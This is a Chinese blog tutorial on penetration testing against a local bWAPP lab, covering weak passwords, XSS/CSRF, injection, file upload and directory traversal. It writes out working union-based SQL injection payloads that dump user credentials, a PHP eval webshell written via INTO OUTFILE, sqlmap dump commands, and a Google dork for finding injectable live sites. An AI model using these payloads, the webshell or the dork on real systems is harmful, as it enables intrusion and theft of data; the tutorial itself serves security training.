{"title":"渗透测试(Pentesting)常见案例及复现","date":"2021-03-12T02:49:46.256Z","slug":"introduce-pentesting","comments":true,"tags":["BurpSuite","Fiddler","Kali","OWASP Top 10","SQL Injection","SqlMap","bWAPP","bwapp","pentesting","乌云","渗透测试"],"updated":"2021-03-12T03:06:32.051Z","content":"<ul>\n<li><h3 id=\"工具及环境\"><a href=\"#工具及环境\" class=\"headerlink\" title=\"工具及环境\"></a>工具及环境</h3><ul>\n<li><a href=\"https://windows.php.net/downloads/releases/archives/\" target=\"_blank\" rel=\"noopener\">PHP</a></li>\n<li><a href=\"https://www.mirrorservice.org/sites/ftp.mysql.com/Downloads/\" target=\"_blank\" rel=\"noopener\">MySQL</a></li>\n<li><a href=\"http://www.itsecgames.com/\" target=\"_blank\" rel=\"noopener\">bWAPP</a></li>\n<li><a href=\"http://sqlmap.org/\" target=\"_blank\" rel=\"noopener\">SqlMap</a></li>\n<li><a href=\"https://portswigger.net/burp\" target=\"_blank\" rel=\"noopener\">BurpSuite</a></li>\n<li><a href=\"https://www.telerik.com/download/fiddler\" target=\"_blank\" rel=\"noopener\">Fiddler</a></li>\n<li><a href=\"https://www.freebuf.com/articles/system/93323.html\" target=\"_blank\" rel=\"noopener\">中国菜刀</a></li>\n</ul>\n</li>\n<li><h3 id=\"Part-I\"><a href=\"#Part-I\" class=\"headerlink\" title=\"Part I\"></a>Part I</h3><h4 id=\"0x00-弱口令\"><a href=\"#0x00-弱口令\" class=\"headerlink\" title=\"0x00.弱口令\"></a>0x00.弱口令</h4><blockquote>\n<p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。</p>\n</blockquote>\n<ul>\n<li><a href=\"https://www.aqniu.com/learn/35241.html\" target=\"_blank\" rel=\"noopener\">撞库</a></li>\n<li><a href=\"https://www.freebuf.com/sectool/159488.html\" target=\"_blank\" rel=\"noopener\">爆破</a></li>\n<li>网络设置：更改本地代理至127.0.0.1:8080</li>\n<li>Intruder模块<br><img src=\"../images/20210312/intruder-setting.png\" alt=\"intruder\"></li>\n<li>Payloads<br><img src=\"../images/20210312/burp-payloads-setting.png\" alt=\"Payloads\"></li>\n<li>Attack<br><img src=\"../images/20210312/burp-attack.png\" alt=\"Attack\"></li>\n</ul>\n<h4 id=\"0x01-XSS-amp-amp-CSRF\"><a href=\"#0x01-XSS-amp-amp-CSRF\" class=\"headerlink\" title=\"0x01.XSS &amp;&amp; CSRF\"></a>0x01.XSS &amp;&amp; CSRF</h4><blockquote>\n<p>跨站脚本是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。</p>\n</blockquote>\n<ul>\n<li><a href=\"http://192.168.36.129:3000/xss_get.php\" target=\"_blank\" rel=\"noopener\">[本地]反射型</a></li>\n<li><a href=\"http://192.168.36.129:3000/xss_stored_1.php\" target=\"_blank\" rel=\"noopener\">[本地]存储型</a></li>\n<li><a href=\"http://192.168.36.129:3000/xss_stored_1.php\" target=\"_blank\" rel=\"noopener\">[本地]CSRF</a><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://test.com/change_pwd?newPwd=123456\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"0x02-代码注入\"><a href=\"#0x02-代码注入\" class=\"headerlink\" title=\"0x02.代码注入\"></a>0x02.代码注入</h4><blockquote>\n<p>代码注入是一种肇因于处理非法数据的计算机臭虫应用。代码注入可被攻击者用来导入代码到某特定的计算机程序，以改变程序的运行进程或目的。</p>\n</blockquote>\n<ul>\n<li><a href=\"http://192.168.36.129:3000/phpi.php?message=test\" target=\"_blank\" rel=\"noopener\">[本地]PHP Code Injection</a></li>\n</ul>\n<h4 id=\"0x03-命令行注入\"><a href=\"#0x03-命令行注入\" class=\"headerlink\" title=\"0x03.命令行注入\"></a>0x03.命令行注入</h4><blockquote>\n<p>利用可以调用系统命令的web应用，通过构造特殊命令字符串的方式，把恶意代码输入一个编辑域(例如缺乏有效验证的输入框)来改变网页动态生成的内容，最终实现本应在服务端才能工作的系统命令。</p>\n</blockquote>\n<ul>\n<li><a href=\"http://192.168.36.129:3000/commandi.php\" target=\"_blank\" rel=\"noopener\">[本地]OS Command Injection</a></li>\n</ul>\n<h4 id=\"0x04-会话修改-劫持\"><a href=\"#0x04-会话修改-劫持\" class=\"headerlink\" title=\"0x04.会话修改/劫持\"></a>0x04.会话修改/劫持</h4><blockquote>\n<p>会话劫持（Session hijacking），这是一种通过获取用户Session ID后，使用该Session ID登录目标账号的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。会话劫持的第一步是取得一个合法的会话标识来伪装成合法用户，因此需要保证会话标识不被泄漏。</p>\n</blockquote>\n<ul>\n<li><a href=\"http://192.168.36.129:3000/smgmt_admin_portal.php\" target=\"_blank\" rel=\"noopener\">[本地]Session Mgmt</a></li>\n</ul>\n<h4 id=\"0x05-SQL注入\"><a href=\"#0x05-SQL注入\" class=\"headerlink\" title=\"0x05.SQL注入\"></a>0x05.SQL注入</h4><blockquote>\n<p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>\n</blockquote>\n<ul>\n<li><a href=\"http://192.168.36.129:3000/sqli_2.php?movie=6\" target=\"_blank\" rel=\"noopener\">[本地]SQL Injection (GET/Select)</a></li>\n<li><code>辽宁 inurl:?.php?id=</code></li>\n<li><a href=\"http://nic.hrbeu.edu.cn/_upload/article/files/4d/a2/543a91024b739b31ebe631355019/3d713f50-e1a0-45ec-83b1-46629106262d.pdf\" target=\"_blank\" rel=\"noopener\">网络安全法第二十七条、六十三条</a></li>\n</ul>\n<h4 id=\"0x06-上传\"><a href=\"#0x06-上传\" class=\"headerlink\" title=\"0x06.上传\"></a>0x06.上传</h4><blockquote>\n<p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。</p>\n</blockquote>\n<ul>\n<li><a href=\"http://192.168.36.129:3000/unrestricted_file_upload.php\" target=\"_blank\" rel=\"noopener\">[本地]Unrestricted File Upload</a></li>\n<li>规则：<br><img src=\"../images/20210312/upload-files-poc-medium-fiddler-rules.png\" alt=\"上传\"></li>\n<li>改包：利用Windows文件名解析技巧<br><img src=\"../images/20210312/upload-files-poc-medium-poc.png\" alt=\"上传\"></li>\n</ul>\n<h3 id=\"0x07-抓包改包\"><a href=\"#0x07-抓包改包\" class=\"headerlink\" title=\"0x07.抓包改包\"></a>0x07.抓包改包</h3><h4 id=\"0x08-任意文件浏览-目录遍历\"><a href=\"#0x08-任意文件浏览-目录遍历\" class=\"headerlink\" title=\"0x08.任意文件浏览/目录遍历\"></a>0x08.任意文件浏览/目录遍历</h4><blockquote>\n<p>目录遍历漏洞在国内外有许多不同的叫法，也可以叫做信息泄露漏洞、非授权文件包含漏洞等。目录遍历是针对Windows IIS和Apache的一种常见攻击方法，它可能让攻击者访问受限制的目录，通过执行cmd.exe /c命令来提取目录信息，或者在Web服务器的根目录以外执行命令。</p>\n</blockquote>\n<ul>\n<li><a href=\"http://192.168.36.129:3000/directory_traversal_2.php?directory=documents\" target=\"_blank\" rel=\"noopener\">[本地]Directory Traversal - Directories</a></li>\n</ul>\n<h4 id=\"0x09-代码审计\"><a href=\"#0x09-代码审计\" class=\"headerlink\" title=\"0x09.代码审计\"></a>0x09.代码审计</h4><blockquote>\n<p>代码审计(Code audit)是一种以发现程序错误，安全漏洞和违反程序规范为目标的源代码分析。它是防御性编程范式的一部分。</p>\n</blockquote>\n<h4 id=\"0x10-文件接口目录权限-重要\"><a href=\"#0x10-文件接口目录权限-重要\" class=\"headerlink\" title=\"0x10.文件接口目录权限[重要]\"></a>0x10.文件接口目录权限[重要]</h4><ul>\n<li>页面iframe授权及验证</li>\n<li>接口敏感数据授权、过滤及验证</li>\n</ul>\n<h4 id=\"0x11-Kali\"><a href=\"#0x11-Kali\" class=\"headerlink\" title=\"0x11.Kali\"></a>0x11.Kali</h4><ul>\n<li><a href=\"https://zh.wikipedia.org/zh-hans/Kali_Linux\" target=\"_blank\" rel=\"noopener\">关于</a></li>\n<li><a href=\"https://zh.wikipedia.org/wiki/BackTrack\" target=\"_blank\" rel=\"noopener\">BackTrack</a><br><img src=\"../images/20210312/kali.png\" alt=\"Kali\"></li>\n</ul>\n<h4 id=\"0x12-GoogleHack\"><a href=\"#0x12-GoogleHack\" class=\"headerlink\" title=\"0x12.GoogleHack\"></a>0x12.GoogleHack</h4><ul>\n<li><a href=\"https://www.exploit-db.com/google-hacking-database\" target=\"_blank\" rel=\"noopener\">GoogleHacking</a></li>\n<li><a href=\"https://zoomeye.org\" target=\"_blank\" rel=\"noopener\">ZoomEye</a></li>\n<li><a href=\"https://www.shodan.io\" target=\"_blank\" rel=\"noopener\">Shodan</a></li>\n</ul>\n<h4 id=\"0x13-Exploit-DB\"><a href=\"#0x13-Exploit-DB\" class=\"headerlink\" title=\"0x13.Exploit-DB\"></a>0x13.Exploit-DB</h4><ul>\n<li><a href=\"https://www.exploit-db.com/\" target=\"_blank\" rel=\"noopener\">首页</a></li>\n</ul>\n<h4 id=\"0x14-WooYun\"><a href=\"#0x14-WooYun\" class=\"headerlink\" title=\"0x14.WooYun\"></a>0x14.WooYun</h4><ul>\n<li><a href=\"https://web.archive.org/web/20160618033639/http://www.wooyun.org/about\" target=\"_blank\" rel=\"noopener\">[科学上网]关于</a></li>\n<li><a href=\"https://web.archive.org/web/20160618033658/http://www.wooyun.org/index.php\" target=\"_blank\" rel=\"noopener\">[科学上网]缓存页</a></li>\n<li><a href=\"http://www.anzerclub.com/yuedu/renwu/245.html\" target=\"_blank\" rel=\"noopener\">剑心</a><br><img src=\"../images/20210312/wooyun.png\" alt=\"WooYun\"></li>\n</ul>\n<h4 id=\"0x16-文档\"><a href=\"#0x16-文档\" class=\"headerlink\" title=\"0x16.文档\"></a>0x16.文档</h4><ul>\n<li><a href=\"https://www.owasp.org/images/5/58/OWASP_Top_10_2017_%E4%B8%AD%E6%96%87%E7%89%88v1.2.pdf\" target=\"_blank\" rel=\"noopener\">OWASP Top10</a></li>\n</ul>\n</li>\n</ul>\n<hr>\n<ul>\n<li><h3 id=\"Part-II\"><a href=\"#Part-II\" class=\"headerlink\" title=\"Part II\"></a>Part II</h3><h4 id=\"0x00-手工注入\"><a href=\"#0x00-手工注入\" class=\"headerlink\" title=\"0x00: 手工注入\"></a>0x00: 手工注入</h4><h5 id=\"判断是否存在注入\"><a href=\"#判断是否存在注入\" class=\"headerlink\" title=\"判断是否存在注入\"></a>判断是否存在注入</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.36.129:3000/sqli_2.php?movie=6 and 1=1 页面正常</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.36.129:3000/sqli_2.php?movie=6 and 1=2 页面异常</span><br></pre></td></tr></table></figure>\n<h5 id=\"暴露基本信息\"><a href=\"#暴露基本信息\" class=\"headerlink\" title=\"暴露基本信息\"></a>暴露基本信息</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.36.129:3000/sqli_2.php?movie=6 order by 8 错误</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Tips: [ORDER BY {col_name | expr | position} [ASC | DESC], …],这里传入的是position排序，根据某个potion排序，当超过表字段数量时就会报错。</p>\n</blockquote>\n<p><img src=\"../images/20210312/sqli.png\" alt=\"sql\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.36.129:3000/sqli_2.php?movie=6 and 1=2 union select 1,2,3,4,5,6,7</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Tips：<a href=\"http://192.168.36.129:3000/sqli_2.php?movie=6\" target=\"_blank\" rel=\"noopener\">http://192.168.36.129:3000/sqli_2.php?movie=6</a> and 1=2返回空，最后返回union select 1,2,3,4,5,6,7一条记录,页面显示的数字对应数据库所在字段的position</p>\n</blockquote>\n<h5 id=\"查看目标基本信息\"><a href=\"#查看目标基本信息\" class=\"headerlink\" title=\"查看目标基本信息\"></a>查看目标基本信息</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.36.129:3000/sqli_2.php?movie=6 and 1=2 union select 1,group_concat(database(),0x20,user(),0x20,@@version,0x20,@@basedir,0x20,@@datadir,0x20,current_user),3,4,5,6,7</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Tips：0x20作为单字节表示，可以用于字符型变量的赋值，用于char时，其代表ascii码值0x20，即字符空格’ ‘，这里用于区分database()等字段回显信息。</p>\n</blockquote>\n<h5 id=\"获取当前数据库所有表\"><a href=\"#获取当前数据库所有表\" class=\"headerlink\" title=\"获取当前数据库所有表\"></a>获取当前数据库所有表</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.36.129:3000/sqli_2.php?movie=6 and 1=2 union select 1,group_concat(TABLE_NAME),3,4,5,6,7 from information_schema.tables <span class=\"built_in\">where</span> table_schema=database()</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Tips：MySQL所有数据库表都会存储于information_schema库中的tables表中。table_schema为数据库名称，TABLE_NAME为对应数据库表名称。基于Web的数据库管理应用</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-- 查看数据库所有表 </span><br><span class=\"line\">select TABLE_NAME from information_schema.tables</span><br></pre></td></tr></table></figure>\n<h5 id=\"获取对应表的所有列\"><a href=\"#获取对应表的所有列\" class=\"headerlink\" title=\"获取对应表的所有列\"></a>获取对应表的所有列</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.36.129:3000/sqli_2.php?movie=6 and 1=2 union select 1,2,3,group_concat(column_name),5,6,7 from information_schema.columns <span class=\"built_in\">where</span> table_schema=database() and table_name=<span class=\"string\">\"users\"</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Tips：MySQL所有数据库列都会存储于information_schemacolumnstable_schema为数据库名称，table_name为对应数据库表名称。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-- 查看数据库所有列</span><br><span class=\"line\">select column_name from information_schema.columns</span><br></pre></td></tr></table></figure>\n</blockquote>\n<h5 id=\"获取对应列数据\"><a href=\"#获取对应列数据\" class=\"headerlink\" title=\"获取对应列数据\"></a>获取对应列数据</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.36.129:3000/sqli_2.php?movie=6 and 1=2 union select 1,group_concat(id,login,password,email),3,4,5,6,7 from users</span><br></pre></td></tr></table></figure>\n<h5 id=\"写入poc脚本文件\"><a href=\"#写入poc脚本文件\" class=\"headerlink\" title=\"写入poc脚本文件\"></a>写入poc脚本文件</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.36.129:3000/sqli_2.php?movie=6 and 1=2 union select 0x20,0x20,0x20,0x20,0x20,0x20,<span class=\"string\">'&lt;?php @eval($_POST[cmd]);?&gt;'</span> into outfile <span class=\"string\">'C:/Software/bWAPP/bWAPP/poc.php'</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Tips: into outfile通过SQL命令向服务器对应路径写入文件内容，通常用来写入webshell到Web服务目录。</p>\n</blockquote>\n<h5 id=\"管理webshell及提权\"><a href=\"#管理webshell及提权\" class=\"headerlink\" title=\"管理webshell及提权\"></a>管理webshell及提权</h5><p><img src=\"../images/20210312/exploit.png\" alt=\"提权\"></p>\n<h4 id=\"0x01：SqlMap自动注入\"><a href=\"#0x01：SqlMap自动注入\" class=\"headerlink\" title=\"0x01：SqlMap自动注入\"></a>0x01：SqlMap自动注入</h4><h5 id=\"是否存在注入\"><a href=\"#是否存在注入\" class=\"headerlink\" title=\"是否存在注入\"></a>是否存在注入</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u http://192.168.36.129:3000/sqli_2.php?movie=6</span><br></pre></td></tr></table></figure>\n<h5 id=\"获取数据库\"><a href=\"#获取数据库\" class=\"headerlink\" title=\"获取数据库\"></a>获取数据库</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u http://192.168.36.129:3000/sqli_2.php?movie=6 --cookie=<span class=\"string\">\"security_level=0; PHPSESSID=uovrdlujopr4jbd44p4afjavv2\"</span> --current-db</span><br></pre></td></tr></table></figure>\n<h5 id=\"获取数据库表\"><a href=\"#获取数据库表\" class=\"headerlink\" title=\"获取数据库表\"></a>获取数据库表</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u http://192.168.36.129:3000/sqli_2.php?movie=6 --cookie=<span class=\"string\">\"security_level=0; PHPSESSID=uovrdlujopr4jbd44p4afjavv2\"</span> -D bwapp --tables</span><br></pre></td></tr></table></figure>\n<h5 id=\"获取数据库表列\"><a href=\"#获取数据库表列\" class=\"headerlink\" title=\"获取数据库表列\"></a>获取数据库表列</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u http://192.168.36.129:3000/sqli_2.php?movie=6 --cookie=<span class=\"string\">\"security_level=0; PHPSESSID=uovrdlujopr4jbd44p4afjavv2\"</span> -T users --columns</span><br></pre></td></tr></table></figure>\n<h5 id=\"获取数据库表数据\"><a href=\"#获取数据库表数据\" class=\"headerlink\" title=\"获取数据库表数据\"></a>获取数据库表数据</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap -u http://192.168.36.129:3000/sqli_2.php?movie=6 --cookie=<span class=\"string\">\"security_level=0; PHPSESSID=uovrdlujopr4jbd44p4afjavv2\"</span> -T users --columns --dump</span><br></pre></td></tr></table></figure>\n<p><img src=\"../images/20210312/sqlmap.png\" alt=\"sqlmap\"></p>\n<h4 id=\"SqlMap参数参考\"><a href=\"#SqlMap参数参考\" class=\"headerlink\" title=\"SqlMap参数参考\"></a>SqlMap参数参考</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Options:</span><br><span class=\"line\">  -h, --help            Show basic help message and exit</span><br><span class=\"line\">  -hh                   Show advanced help message and exit</span><br><span class=\"line\">  --version             Show program&apos;s version number and exit</span><br><span class=\"line\">  -v VERBOSE            Verbosity level: 0-6 (default 1)</span><br><span class=\"line\"></span><br><span class=\"line\">Target:</span><br><span class=\"line\">  At least one of these options has to be provided to define the</span><br><span class=\"line\">  target(s)</span><br><span class=\"line\"></span><br><span class=\"line\">  -u URL, --url=URL   Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)</span><br><span class=\"line\">  -g GOOGLEDORK       Process Google dork results as target URLs</span><br><span class=\"line\"></span><br><span class=\"line\">Request:</span><br><span class=\"line\">  These options can be used to specify how to connect to the target URL</span><br><span class=\"line\"></span><br><span class=\"line\">  --data=DATA         Data string to be sent through POST (e.g. &quot;id=1&quot;)</span><br><span class=\"line\">  --cookie=COOKIE     HTTP Cookie header value (e.g. &quot;PHPSESSID=a8d127e..&quot;)</span><br><span class=\"line\">  --random-agent      Use randomly selected HTTP User-Agent header value</span><br><span class=\"line\">  --proxy=PROXY       Use a proxy to connect to the target URL</span><br><span class=\"line\">  --tor               Use Tor anonymity network</span><br><span class=\"line\">  --check-tor         Check to see if Tor is used properly</span><br><span class=\"line\"></span><br><span class=\"line\">Injection:</span><br><span class=\"line\">  These options can be used to specify which parameters to test for,</span><br><span class=\"line\">  provide custom injection payloads and optional tampering scripts</span><br><span class=\"line\"></span><br><span class=\"line\">  -p TESTPARAMETER    Testable parameter(s)</span><br><span class=\"line\">  --dbms=DBMS         Force back-end DBMS to provided value</span><br><span class=\"line\"></span><br><span class=\"line\">Detection:</span><br><span class=\"line\">  These options can be used to customize the detection phase</span><br><span class=\"line\"></span><br><span class=\"line\">  --level=LEVEL       Level of tests to perform (1-5, default 1)</span><br><span class=\"line\">  --risk=RISK         Risk of tests to perform (1-3, default 1)</span><br><span class=\"line\"></span><br><span class=\"line\">Techniques:</span><br><span class=\"line\">  These options can be used to tweak testing of specific SQL injection</span><br><span class=\"line\">  techniques</span><br><span class=\"line\"></span><br><span class=\"line\">  --technique=TECH..  SQL injection techniques to use (default &quot;BEUSTQ&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">Enumeration:</span><br><span class=\"line\">  These options can be used to enumerate the back-end database</span><br><span class=\"line\">  management system information, structure and data contained in the</span><br><span class=\"line\">  tables. Moreover you can run your own SQL statements</span><br><span class=\"line\"></span><br><span class=\"line\">  -a, --all           Retrieve everything</span><br><span class=\"line\">  -b, --banner        Retrieve DBMS banner</span><br><span class=\"line\">  --current-user      Retrieve DBMS current user</span><br><span class=\"line\">  --current-db        Retrieve DBMS current database</span><br><span class=\"line\">  --passwords         Enumerate DBMS users password hashes</span><br><span class=\"line\">  --tables            Enumerate DBMS database tables</span><br><span class=\"line\">  --columns           Enumerate DBMS database table columns</span><br><span class=\"line\">  --schema            Enumerate DBMS schema</span><br><span class=\"line\">  --dump              Dump DBMS database table entries</span><br><span class=\"line\">  --dump-all          Dump all DBMS databases tables entries</span><br><span class=\"line\">  -D DB               DBMS database to enumerate</span><br><span class=\"line\">  -T TBL              DBMS database table(s) to enumerate</span><br><span class=\"line\">  -C COL              DBMS database table column(s) to enumerate</span><br><span class=\"line\"></span><br><span class=\"line\">Operating system access:</span><br><span class=\"line\">  These options can be used to access the back-end database management</span><br><span class=\"line\">  system underlying operating system</span><br><span class=\"line\"></span><br><span class=\"line\">  --os-shell          Prompt for an interactive operating system shell</span><br><span class=\"line\">  --os-pwn            Prompt for an OOB shell, Meterpreter or VNC</span><br><span class=\"line\"></span><br><span class=\"line\">General:</span><br><span class=\"line\">  These options can be used to set some general working parameters</span><br><span class=\"line\"></span><br><span class=\"line\">  --batch             Never ask for user input, use the default behavior</span><br><span class=\"line\">  --flush-session     Flush session files for current target</span><br><span class=\"line\"></span><br><span class=\"line\">Miscellaneous:</span><br><span class=\"line\">  --sqlmap-shell      Prompt for an interactive sqlmap shell</span><br><span class=\"line\">  --wizard            Simple wizard interface for beginner users</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<hr>\n<ul>\n<li><h3 id=\"Part-III\"><a href=\"#Part-III\" class=\"headerlink\" title=\"Part III\"></a>Part III</h3>当目标站点不能找到可利用的渗透方式是，可以尝试C段和旁注以及探测目标服务器端口服务，利用所在服务漏洞或者操作系统层漏洞进行测试。</li>\n</ul>\n","next":{"title":"Puppeteer应用场景总结","slug":"introduce-puppeteer"},"link":"https://www.alipay.one/post/introduce-pentesting/"}